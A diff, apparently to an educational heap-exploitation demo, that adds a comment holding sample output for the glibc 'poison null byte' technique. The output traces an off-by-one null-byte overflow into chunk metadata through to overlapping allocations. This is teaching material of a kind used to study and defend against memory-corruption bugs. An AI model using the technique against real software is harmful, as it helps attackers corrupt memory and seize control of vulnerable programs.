@@ -87,3 +87,37 @@ int main()
 	fprintf(stderr, "Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
 		"for the clear explanation of this technique.\n");
 }
+
+/*
+
+Welcome to poison null byte 2.0!
+Tested in Ubuntu 14.04 64bit.
+This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
+We allocate 0x100 bytes for 'a'.
+a: 0x5652fbcc2260
+Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
+b: 0x5652fbcc2370
+c: 0x5652fbcc2580
+We allocate a barrier at 0x5652fbcc2690, so that c is not consolidated with the top-chunk when freed.
+The barrier is not strictly necessary, but makes things less confusing
+b.size: 0x211
+b.size is: (0x200 + 0x10) | prev_in_use
+We overflow 'a' with a single null byte into the metadata of 'b'
+b.size: 0x200
+c.prev_size is 0
+b1: 0x5652fbcc27a0
+Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0
+Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: 0
+We malloc 'b2', our 'victim' chunk.
+b2: 0x5652fbcc28b0
+Current b2 content:
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
+Finally, we allocate 'd', overlapping 'b2'.
+d: 0x5652fbcc2940
+Now 'd' and 'b2' overlap.
+New b2 content:
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf for the clear explanation of this technique.
+
+*/
